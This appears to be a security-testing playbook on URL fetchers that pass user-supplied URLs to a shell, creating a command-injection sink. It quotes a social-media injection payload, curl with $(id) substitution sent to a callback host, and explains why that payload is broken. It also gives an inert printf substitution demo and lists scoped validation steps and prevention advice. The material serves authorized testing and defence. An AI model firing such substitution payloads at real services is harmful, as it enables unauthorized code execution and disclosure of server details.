# URL Fetchers as Shell-Execution Sinks

A URL import, preview, image fetch, webhook test, or converter may hand the
supplied URL to a system utility. That makes the URL a possible **command
injection** source as well as an SSRF source; a server-side fetch alone does
not establish a shell or execution. Source lead: [DarkShadow's post,
2026-11-17](https://x.com/darkshadow2bd/status/2122596865934033258); its
payload is a hypothesis, not a verified target or universally working recipe.

## Mechanism and recognition

Trace the supplied URL through decoding and validation into the actual process
consumer, including asynchronous workers. A string built as shell command text
can turn backticks or `$(...)` in the URL into shell substitutions **before**
the intended fetch command runs. A direct HTTP client or a process API passing
a URL as a separate argument without a shell does not interpret those shell
metacharacters. Shell escaping, quoting, transforms, and any later evaluation
also matter; the name `exec` alone does not determine shell behavior.

In a disposable local shell, an inert example illustrates the boundary:

```text
shell text:  printf '%s\n' https://example.invalid/`printf MARK`
result:      https://example.invalid/MARK
```

The shell runs the nested `printf`, captures its stdout, and inserts it into
the outer command's argument. By contrast, a correctly single-quoted URL or
an argv element passed directly to the process is data, not shell source.
Double quotes alone do not prevent command substitution. This does not assert
that a particular application constructs its command in either form.

The post's literal `curl{$IFS}burplink/$(id)` should **not** be copied as a
working payload: with default IFS, local Bash split it into a command named
`curl{`, which did not exist. The nested `$(id)` can nevertheless execute
before that failed command if the fragment is parsed as shell source; failure
to produce the intended callback does not prove no execution. `${IFS}` and
`{$IFS}` are different shell syntax. Even a corrected separator doesn't make
the example reliable: command output may contain spaces/newlines, be split into
arguments, or need URL encoding; callbacks have other environmental
prerequisites. `id` can expose execution identity, so prefer a non-sensitive
unique marker for an owned, authorized proof instead.

## Discriminator and limits

1. Establish a normal fetch baseline and identify the specific source,
   representation, transform, suspected executor, and trigger. Consider URL
   decoding, parser order, logging, and deferred workers.
2. Follow `rce-validation`: compare a bounded, inert shell-expansion
   discriminator with a literal/control sibling on owned scoped fixtures. A
   unique reflected expansion may support execution when competing reflection,
   caching, and unrelated processing are excluded. For blind flows use a
   separately authorized task-scoped observation channel only when necessary.
3. A server-origin HTTP callback can prove a fetch; it does not by itself prove
   execution. Attribute an execution signal to a transformation the ordinary
   fetch cannot produce, with control and correlation. Absence of a callback
   is not a negative for an asynchronous or blind consumer without a reliable
   observer. Stop after sufficient bounded proof; do not enumerate the host,
   read secrets, establish persistence, or assume private-network reachability.

For prevention, prefer a dedicated HTTP client or direct argument-vector
process invocation; do not concatenate untrusted input into shell commands.
Apply URL destination and redirect controls separately: avoiding a shell
injection does not itself prevent SSRF.
